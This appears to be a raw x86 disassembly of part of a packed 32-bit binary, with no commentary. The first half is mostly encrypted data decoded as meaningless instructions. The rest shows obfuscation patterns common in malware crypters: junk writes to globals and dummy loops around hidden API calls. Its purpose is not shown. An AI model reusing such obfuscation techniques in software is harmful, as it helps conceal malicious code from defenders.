  408c78:	pusha  
  408c79:	(bad)  
  408c7a:	jg     0x408bfc
  408c7c:	inc    edx
  408c7d:	cmp    DWORD PTR [edx-0x794ab000],ebx
  408c83:	xor    eax,0xe3f3dc50
  408c88:	adc    dl,BYTE PTR [ebx]
  408c8a:	ret    0xaa29
  408c8d:	mov    dl,0x57
  408c8f:	cdq    
  408c90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c91:	cdq    
  408c92:	(bad)  
  408c93:	retf   
  408c94:	cwde   
  408c95:	js     0xbdd2024f
  408c9b:	mov    bl,0xbe
  408c9d:	or     BYTE PTR [ecx-0x2a166d41],bh
  408ca3:	inc    edx
  408ca4:	(bad)
  408ca7:	inc    edx
  408ca8:	pop    es
  408ca9:	inc    edx
  408caa:	(bad)
  408cae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408caf:	sbb    eax,0xffbfdf0d
  408cb4:	lds    esp,FWORD PTR [eax+0xe]
  408cb7:	call   0x16fd76e9
  408cbc:	cmp    al,BYTE PTR [ebp-0x7]
  408cbf:	les    ebp,FWORD PTR [edi-0x4cdc8e58]
  408cc5:	cld    
  408cc6:	fs std 
  408cc8:	adc    ah,BYTE PTR [edi+edx*4-0x17]
  408ccc:	adc    BYTE PTR [eax+0x2f49039a],dh
  408cd2:	add    dl,bl
  408cd4:	fneni(8087 only) 
  408cd6:	cmp    eax,0x80d92cf7
  408cdb:	add    DWORD PTR [ecx+0x6f833a91],ebx
  408ce1:	outs   dx,BYTE PTR ds:[esi]
  408ce2:	data16 sahf 
  408ce4:	add    eax,0xa6354210
  408ce9:	jge    0x408d2e
  408ceb:	or     edi,DWORD PTR [esi]
  408ced:	or     BYTE PTR [esi+0x75],ah
  408cf0:	xchg   BYTE PTR [ecx],dl
  408cf2:	fcomp  DWORD PTR [esi]
  408cf4:	dec    eax
  408cf5:	cmp    al,0xb1
  408cf7:	lods   al,BYTE PTR ds:[esi]
  408cf8:	bound  ebp,QWORD PTR [edx-0x45]
  408cfb:	les    esp,FWORD PTR [eax]
  408cfd:	lods   al,BYTE PTR ds:[esi]
  408cfe:	sbb    dl,cl
  408d00:	lds    edi,FWORD PTR [esi]
  408d02:	mov    edi,DWORD PTR [esi-0x6]
  408d05:	ins    BYTE PTR es:[edi],dx
  408d06:	push   0x362b470e
  408d0b:	fstp   st(2)
  408d0d:	push   es
  408d0e:	cmp    BYTE PTR [edi-0x7],dl
  408d11:	jp     0x408d86
  408d13:	in     al,0x5
  408d15:	pop    ecx
  408d16:	cmp    BYTE PTR [ecx+edi*8-0x4c],dl
  408d1a:	push   eax
  408d1b:	adc    edx,DWORD PTR [ebx-0x40]
  408d1e:	and    ecx,DWORD PTR [esp+eax*1]
  408d21:	pop    eax
  408d22:	pusha  
  408d23:	add    al,0x35
  408d25:	mov    dl,0x6f
  408d27:	(bad)  
  408d28:	imul   ebp,ebp,0x805ddffe
  408d2e:	enter  0x9667,0xf
  408d32:	dec    ebx
  408d33:	push   0x26
  408d35:	bound  esi,QWORD PTR [ebx-0x1f]
  408d38:	retf   0xaa9
  408d3b:	stos   BYTE PTR es:[edi],al
  408d3c:	out    dx,al
  408d3d:	into   
  408d3e:	mov    cl,0x38
  408d40:	or     eax,0x8bb0f721
  408d45:	scas   eax,DWORD PTR es:[edi]
  408d46:	xor    cl,BYTE PTR [edx+0x1ef6373b]
  408d4c:	ror    BYTE PTR [eax],0xb4
  408d4f:	or     al,al
  408d51:	sub    bl,BYTE PTR [edx]
  408d53:	inc    edi
  408d54:	scas   al,BYTE PTR es:[edi]
  408d55:	and    al,0x8
  408d57:	or     BYTE PTR [edx+0x1d],al
  408d5a:	jns    0x408cf8
  408d5c:	and    eax,0xd9be7724
  408d61:	xchg   ebx,eax
  408d62:	cmp    eax,DWORD PTR [edi]
  408d64:	mov    ebx,0x15e89438
  408d69:	add    al,BYTE PTR [edx+0x3]
  408d6c:	lods   al,BYTE PTR ds:[esi]
  408d6d:	sub    cl,BYTE PTR [ecx]
  408d6f:	imul   ecx,edi,0x4383ea2f
  408d75:	lods   eax,DWORD PTR ds:[esi]
  408d76:	popf   
  408d77:	stos   BYTE PTR es:[edi],al
  408d78:	add    edx,edi
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	data16 cmp ah,BYTE PTR ds:0x7ed1b1cf
  408db1:	jle    0x408d3d
  408db3:	jg     0x408e33
  408db5:	jle    0x408d6c
  408db7:	popa   
  408db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408db9:	(bad)  
  408dbc:	dec    ebp
  408dbd:	jle    0x408df2
  408dbf:	or     cl,dl
  408dc1:	nop
  408dc2:	push   edx
  408dc3:	das    
  408dc4:	xchg   ecx,eax
  408dc5:	sub    ecx,edi
  408dc7:	cmp    al,0xff
  408dc9:	add    dl,ah
  408dcb:	sub    ecx,DWORD PTR [edx-0x1b723103]
  408dd1:	dec    esi
  408dd2:	inc    ecx
  408dd3:	out    0x16,eax
  408dd5:	stos   DWORD PTR es:[edi],eax
  408dd6:	pop    esp
  408dd7:	xor    DWORD PTR [esi+ebx*8],ecx
  408dda:	add    esi,DWORD PTR [eax+0x7a9eb13f]
  408de0:	test   eax,0xf5b7baa6
  408de5:	test   esp,edi
  408de7:	sti    
  408de8:	jbe    0x408dbd
  408dea:	sub    BYTE PTR [eax-0x64154cc2],cl
  408df0:	pushf  
  408df1:	hlt    
  408df2:	push   ds
  408df3:	popf   
  408df4:	jle    0x408d8d
  408df6:	test   DWORD PTR [edi*2+0x489c34a6],edx
  408dfd:	lods   al,BYTE PTR ds:[esi]
  408dfe:	mov    BYTE PTR [ebp+0x65],ah
  408e01:	imul   ebp,DWORD PTR [eax+0x46e7aa52],0x458a6095
  408e0b:	inc    esi
  408e0c:	ror    BYTE PTR [eax-0x4b],0x81
  408e10:	loop   0x408dcd
  408e12:	sub    al,bh
  408e14:	cli    
  408e15:	mov    DWORD PTR [edi],esi
  408e17:	sbb    BYTE PTR ds:[esi-0x3b],0x3
  408e1c:	fbld   TBYTE PTR [ebp-0x414a3a02]
  408e22:	cs ss mov dl,0x98
  408e26:	adc    BYTE PTR [esi-0x5885f911],ch
  408e2c:	mov    ah,0x42
  408e2e:	out    0xe5,eax
  408e30:	add    eax,0x89f0fb98
  408e35:	sub    al,BYTE PTR [edx]
  408e37:	pop    es
  408e38:	xor    cl,BYTE PTR [edx]
  408e3a:	hlt    
  408e3b:	data16 int 0xbe
  408e3e:	cmp    BYTE PTR [ebx],0x94
  408e41:	jns    0x408ec1
  408e43:	dec    edx
  408e44:	test   ah,dl
  408e46:	imul   ebx,DWORD PTR [esi+edx*8],0xffffffa1
  408e4a:	sub    al,0xfa
  408e4c:	(bad)  
  408e4d:	dec    DWORD PTR [esi-0x9]
  408e50:	ss pop ss
  408e52:	cdq    
  408e53:	ds leave 
  408e55:	cmp    al,0xb8
  408e57:	jle    0x408de3
  408e59:	or     eax,0x90f79127
  408e5e:	cmp    ebp,DWORD PTR ds:0x4c6927e5
  408e64:	sub    al,0xac
  408e66:	test   eax,0xa51505b3
  408e6b:	xchg   edi,eax
  408e6c:	(bad)  
  408e6d:	sbb    al,0xf2
  408e6f:	push   edi
  408e70:	sbb    ebp,0xffffffa5
  408e73:	adc    al,0xac
  408e75:	cmp    ecx,DWORD PTR [esi]
  408e77:	mov    edi,0xdfead3a1
  408e7c:	outs   dx,DWORD PTR ds:[esi]
  408e7d:	jb     0x408e41
  408e7f:	jb     0x408ef5
  408e81:	push   ebx
  408e82:	sti    
  408e83:	mov    eax,0x7e14aa0e
  408e88:	dec    ebp
  408e89:	leave  
  408e8a:	retf   0x8c57
  408e8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e8e:	icebp  
  408e8f:	xor    al,0x9c
  408e91:	xor    BYTE PTR [edi+0x1b68199e],0x22
  408e98:	fdiv   DWORD PTR [ecx+0x6aa84587]
  408e9e:	sub    DWORD PTR [ecx],ebp
  408ea0:	mov    al,ds:0x2feef110
  408ea5:	inc    esi
  408ea6:	jl     0x408ead
  408ea8:	pop    eax
  408ea9:	xchg   ecx,eax
  408eaa:	imul   esi,ecx,0xffffffa2
  408ead:	jne    0x408f15
  408eaf:	push   esp
  408eb0:	xlat   BYTE PTR ds:[ebx]
  408eb1:	mov    ds:0x8e01b146,al
  408eb6:	shl    esi,1
  408eb8:	cwde   
  408eb9:	pop    eax
  408eba:	fucom  st(0)
  408ebc:	clc    
  408ebd:	jno    0x408ed2
  408ebf:	rol    DWORD PTR [ebp+0x12],cl
  408ec2:	jnp    0x408f26
  408ec4:	ins    BYTE PTR es:[edi],dx
  408ec5:	xor    BYTE PTR [ebx],dh
  408ec7:	imul   edx,ebp,0x5e967674
  408ecd:	cmp    eax,0xdfa4206e
  408ed2:	cmp    BYTE PTR [esi],0xcf
  408ed5:	scas   al,BYTE PTR es:[edi]
  408ed6:	dec    ebx
  408ed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ed8:	dec    ebp
  408ed9:	clc    
  408eda:	sub    DWORD PTR [ebx+0x7e],0x2b
  408ede:	into   
  408edf:	mov    cs,WORD PTR [ecx]
  408ee1:	out    dx,eax
  408ee2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ee3:	ret    
  408ee4:	push   edi
  408ee5:	jns    0x408f38
  408ee7:	arpl   WORD PTR [ebp-0x7ae420],dx
  408eed:	test   al,0xa6
  408eef:	cwde   
  408ef0:	xor    edx,DWORD PTR [eax-0x21]
  408ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ef4:	fisttp WORD PTR [eax]
  408ef6:	dec    ecx
  408ef7:	addr16 mov bh,0xdd
  408efa:	mov    ecx,0xdc9be5f1
  408eff:	ins    DWORD PTR es:[edi],dx
  408f00:	and    bl,bl
  408f02:	lods   al,BYTE PTR ds:[esi]
  408f03:	cld    
  408f04:	mov    bh,0xdd
  408f06:	mov    al,ds:0xa4eb5d2
  408f0b:	push   ss
  408f0c:	and    edi,edi
  408f0e:	jbe    0x408f53
  408f10:	loop   0x408eee
  408f12:	fwait
  408f13:	dec    edi
  408f14:	daa    
  408f15:	stos   DWORD PTR es:[edi],eax
  408f16:	(bad)  
  408f17:	(bad)  
  408f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f19:	ret    
  408f1a:	xchg   DWORD PTR [eax+0x6c0c0f77],eax
  408f20:	jae    0x408f70
  408f22:	inc    ecx
  408f23:	jns    0x408fa3
  408f25:	or     ah,ch
  408f27:	mov    bl,0x13
  408f29:	retf   
  408f2a:	mov    al,0x8a
  408f2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f2d:	lock aad 0xdf
  408f30:	loop   0x408f71
  408f32:	xchg   esp,eax
  408f33:	push   eax
  408f34:	mov    edi,0x37bdcb26
  408f39:	push   esi
  408f3a:	mov    cl,al
  408f3c:	dec    ebp
  408f3d:	icebp  
  408f3e:	test   DWORD PTR [ebx-0x7785cf3c],ebp
  408f44:	aas    
  408f45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f46:	fisubr WORD PTR [edi]
  408f48:	or     al,0xa5
  408f4a:	mov    ebx,DWORD PTR [ebp-0x8]
  408f4d:	xor    edx,eax
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	jnp    0x408fde
  408f62:	das    
  408f63:	pushf  
  408f64:	int    0xdf
  408f66:	jle    0x408fe6
  408f68:	mov    bh,BYTE PTR [edi+0x7e]
  408f6b:	jle    0x408fac
  408f6d:	xchg   edx,eax
  408f6e:	cmp    BYTE PTR [ebx+ecx*2+0x18878540],dl
  408f75:	and    ecx,DWORD PTR [eax-0x7c2fbf65]
  408f7b:	icebp  
  408f7c:	in     al,dx
  408f7d:	jns    0x408f3c
  408f7f:	sar    BYTE PTR [edx+edi*2+0x2d],0x84
  408f84:	sub    al,0xb0
  408f86:	cmp    BYTE PTR [esp+ebp*1],dh
  408f89:	jp     0x408f23
  408f8b:	inc    eax
  408f8c:	pusha  
  408f8d:	mov    cl,0x98
  408f8f:	or     DWORD PTR [edi-0x69],esi
  408f92:	mov    dh,BYTE PTR [esi-0x444129d4]
  408f98:	rcr    DWORD PTR [ecx-0x4861dcad],cl
  408f9e:	popw   ss
  408fa0:	xor    DWORD PTR [edi],0x2a96e634
  408fa6:	dec    esi
  408fa7:	and    esp,DWORD PTR [ebp-0x2449f4e5]
  408fad:	jae    0x408fcb
  408faf:	shr    esi,1
  408fb1:	pop    ebp
  408fb2:	cmp    ah,al
  408fb4:	shl    BYTE PTR [esi],1
  408fb6:	sub    BYTE PTR [eax+eiz*4+0x7cde92ba],al
  408fbd:	and    BYTE PTR [edx-0x7e7a95a0],ah
  408fc3:	push   ds
  408fc4:	int    0xf4
  408fc6:	push   esi
  408fc7:	enter  0x6a2f,0x3
  408fcb:	push   ecx
  408fcc:	ja     0x40903f
  408fce:	xchg   edi,eax
  408fcf:	cmp    al,0x89
  408fd1:	in     al,0x68
  408fd3:	lahf   
  408fd4:	inc    edx
  408fd5:	push   ds
  408fd6:	inc    ebp
  408fd7:	mov    cl,0x71
  408fd9:	lock dec esi
  408fdb:	test   al,0x6a
  408fdd:	push   ebx
  408fde:	popa   
  408fdf:	xchg   BYTE PTR [esi+edi*2+0x756f8ae8],ah
  408fe6:	es jecxz 0x408ff0
  408fe9:	out    dx,al
  408fea:	jno    0x409019
  408fec:	cmp    ecx,DWORD PTR [ecx+0x65]
  408fef:	stos   DWORD PTR es:[edi],eax
  408ff0:	rcr    ebp,0x39
  408ff3:	sbb    edx,DWORD PTR [ecx+0x31]
  408ff6:	sub    al,ah
  408ff8:	outs   dx,DWORD PTR ds:[esi]
  408ff9:	cmp    ebx,edi
  408ffb:	repz pop eax
  408ffd:	mov    eax,0xd8a15e68
  409002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409003:	push   ss
  409004:	cmp    al,0x0
  409006:	pop    edi
  409007:	xlat   BYTE PTR ds:[ebx]
  409008:	test   ch,al
  40900a:	xchg   edx,eax
  40900b:	in     al,dx
  40900c:	push   0x7cc9410
  409011:	out    dx,eax
  409012:	pop    ebp
  409013:	retf   0xb52b
  409016:	jnp    0x409090
  409018:	sbb    al,0xe6
  40901a:	int    0xdd
  40901c:	fadd   st,st(0)
  40901e:	test   DWORD PTR [ebx-0x25],edi
  409021:	je     0x409069
  409023:	or     al,0x69
  409025:	jge    0x409025
  409027:	fbld   TBYTE PTR [ebp-0x75]
  40902a:	fadd   DWORD PTR [ebx]
  40902c:	shl    BYTE PTR [eax-0x8],0xc7
  409030:	and    dh,BYTE PTR [ebx-0x64]
  409033:	cmp    DWORD PTR [edx+0x79],esi
  409036:	icebp  
  409037:	mov    eax,ebp
  409039:	pop    es
  40903a:	aaa    
  40903b:	iret   
  40903c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40903d:	dec    ebp
  40903e:	mov    edi,0x8379aae9
  409043:	xor    edi,edx
  409045:	cs add al,0xbb
  409048:	loope  0x408fda
  40904a:	into   
  40904b:	aad    0x56
  40904d:	pop    ecx
  40904e:	fmul   QWORD PTR ds:0xba743a8a
  409054:	ins    DWORD PTR es:[edi],dx
  409055:	js     0x409026
  409057:	ds dec eax
  409059:	add    bh,bl
  40905b:	stos   DWORD PTR es:[edi],eax
  40905c:	mov    ebx,0x33d62dda
  409061:	(bad)  
  409062:	mov    ds:0xf0a17ee8,al
  409067:	mov    edi,0xaaca4ae4
  40906c:	fmulp  st(1),st
  40906e:	xor    ecx,DWORD PTR [ebp+0x26]
  409071:	int3   
  409072:	mov    ebx,0xb876ef3f
  409077:	je     0x4090a2
  409079:	or     esp,DWORD PTR [ecx]
  40907b:	movzx  eax,WORD PTR [ecx]
  40907e:	int3   
  40907f:	es jmp 0x2bea:0x7388812f
  409087:	push   edx
  409088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409089:	jo     0x409084
  40908b:	push   ecx
  40908c:	inc    ebp
  40908d:	mov    bh,ch
  40908f:	test   al,0x32
  409091:	test   al,0x46
  409093:	xchg   edi,eax
  409094:	mov    WORD PTR [edi-0x6559e033],ds
  40909a:	dec    BYTE PTR [edi-0x23]
  40909d:	pop    esp
  40909e:	push   ss
  40909f:	fld    TBYTE PTR [edx+0x7c7081b]
  4090a5:	rcr    BYTE PTR [ebx-0x4],0xb1
  4090a9:	(bad)  
  4090aa:	mov    dh,0xc3
  4090ac:	mov    ch,0x2a
  4090ae:	or     ebx,DWORD PTR [ebp-0x2b87d3d4]
  4090b4:	xrelease xchg DWORD PTR [esi-0x588c24bf],ebx
  4090bb:	daa    
  4090bc:	loope  0x40910d
  4090be:	pop    edx
  4090bf:	mov    edi,0x8a32f264
  4090c4:	jmp    0x4090e2
  4090c6:	dec    ecx
  4090c7:	push   ds
  4090c8:	inc    esi
  4090c9:	neg    DWORD PTR [ecx+0x64]
  4090cc:	es and ecx,ebp
  4090cf:	stos   DWORD PTR es:[edi],eax
  4090d0:	ror    DWORD PTR [ebx-0x6],0x14
  4090d4:	sbb    al,0x4a
  4090d6:	je     0x409111
  4090d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090d9:	je     0x409123
  4090db:	std    
  4090dc:	and    edx,DWORD PTR [ecx]
  4090de:	vcvtsd2ss xmm1,xmm0,xmm0
  4090e2:	test   DWORD PTR gs:[ecx],edi
  4090e5:	pop    edi
  4090e6:	adc    DWORD PTR [esi+eiz*1+0x2f],0xffffffae
  4090eb:	shr    BYTE PTR [esi-0x2e],0x24
  4090ef:	mov    eax,ds:0xa4528281
  4090f4:	jg     0x4090e7
  4090f6:	sbb    edx,DWORD PTR [eax]
  4090f8:	sti    
  4090f9:	cli    
  4090fa:	xchg   ebx,eax
  4090fb:	mov    esi,esp
  4090fd:	lea    ebx,[eax+ebx*2-0x50f02efd]
  409104:	sar    DWORD PTR [ebx],cl
  409106:	xlat   BYTE PTR ds:[ebx]
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42e937
  40911f:	and    DWORD PTR ds:0x4303db,0x43033d
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42ecdb,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x4303e3,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e6d8,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42e977
  40916b:	sbb    DWORD PTR ds:0x430341,0x430371
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42eccb,0x624a
  409184:	call   DWORD PTR ds:0x42e93f
  40918a:	adc    DWORD PTR ds:0x42e6c0,0x43035d
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x430351,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x430335,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x43036d,0x42e6d4
  4091c4:	call   DWORD PTR ds:0x42e9e3
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e6c8
  4091d6:	and    DWORD PTR ds:0x430359,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x430339,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42ecdb,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42ecdb,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42ecdb,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e8e3
  409219:	mov    ecx,DWORD PTR ds:0x42ecdb
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42ecdb,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ece3,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42ecdf
  409243:	sbb    eax,DWORD PTR ds:0x42ecdb
  409249:	mov    ds:0x42ecdf,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42ecdb
  409261:	and    DWORD PTR ds:0x42e6bc,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x430355,0x4303d7
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e6cc,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x430355,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42eccb,0x4303e7
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42eccb,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x430349,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x430359,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ece3,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e6c8,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x430335,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e8ff
  40930f:	adc    DWORD PTR ds:0x42ecdf,0x42e6cc
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x430355,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x430351,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x430351
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x430351,ecx
  409352:	cmp    DWORD PTR ds:0x430351,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x430351,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e8e7
  409375:	cmp    DWORD PTR ds:0x430351,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x430351
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x430351,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42eccb
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e867
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x4303d3,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x4303eb,0x17
  4093b9:	cmp    DWORD PTR ds:0x4303eb,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x4303eb,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e8eb
  4093df:	cmp    DWORD PTR ds:0x4303eb,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x4303eb
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x4303eb,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x4303eb
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x4303eb,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x4303df,0x10
  409415:	cmp    DWORD PTR ds:0x4303df,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x4303df,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e8ef
  409438:	mov    ecx,DWORD PTR ds:0x4303df
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x4303df,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x430361
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x430369,0x16
  409461:	cmp    DWORD PTR ds:0x430369,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x430369,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e8f3
  409481:	mov    ecx,DWORD PTR ds:0x430369
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x430369,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42eccf,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42eccf
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42eccf,ecx
  4094b7:	cmp    DWORD PTR ds:0x42eccf,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42eccf,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e7fb
  4094d6:	push   0x42e7a5
  4094db:	call   DWORD PTR ds:0x42eb2b
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x430351,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x4303eb,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ece3,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x430369,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x4303e3,0x430371
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x430339,0x1e
  40953f:	cmp    DWORD PTR ds:0x430339,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x430339,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e6dc
  409566:	call   DWORD PTR ds:0x42e8f7
  40956c:	mov    eax,ds:0x430339
  409571:	dec    eax
  409572:	mov    ds:0x430339,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430389
  409582:	mov    eax,ds:0x430413
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x4303cf,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e6d8,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x430341,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x430341
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x430341,edx
  4095e8:	cmp    DWORD PTR ds:0x430341,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e7cd
  409617:	call   DWORD PTR ds:0x42e8fb
